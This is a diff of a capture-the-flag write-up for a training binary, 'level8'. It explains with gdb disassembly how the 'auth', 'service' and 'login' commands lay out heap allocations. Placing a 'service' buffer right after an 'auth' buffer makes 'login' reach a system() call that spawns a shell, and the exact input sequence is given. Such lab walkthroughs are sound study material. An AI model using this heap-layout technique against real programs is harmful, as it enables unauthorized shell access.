@@ -1,9 +1,34 @@
-./level8 
-auth DDDDDDDDDDDDDDDDDDDDDDDDDD
+When we disassemble the <main> function we notice a call to <system> that spawns a shell.
 
-service GGGGGGGGGGGGGGGGGGGGGGGG
+$ (gdb) disas main
+...
+0x080486ee <+394>:	mov    DWORD PTR [esp],0x8048833
+0x080486f5 <+401>:	call   0x8048480 <system@plt>
+...
 
+There are 4 interesting strings in this binary : "auth", "service", "reset", "login".
+When we write theses strings to stdin, a few things happen :
+	- "auth XXXXXXX" : calls <malloc> and <strcpy> and copies the data following "auth " into the memory.
+	- "service XXXXXX" : calls <strdup> and copies data following "service " into the memory.
+	- "reset" : calls <free>
+	- "login" : checks if at ds:0x8049aac+0x20 the memory is not null/empty
+
+In general, when we call <malloc> several times in the row, each pointer is placed right after the previous one (plus some padding in between).
+
+From that we can deduce that for "login" to work and execute the instructions of a shell spawn we need to :
+	- create a pointer with "auth"
+	- add another one right after with "service"
+	- get the shell with "login".
+
+0x080486e2 <+382>:	mov    eax, ds:0x8049aac
+0x080486e7 <+387>:	mov    eax, DWORD PTR [eax+0x20]
+0x080486ea <+390>:	test   eax, eax
+0x080486ec <+392>:	je     0x80486ff <main+411>
+
+In the end it gives us something like
+
+$ ./level8
+auth AAAA
+service AAAAAAAAAAAAAAAAAAAA
 login
-$ 
-got a shell 
-
+$
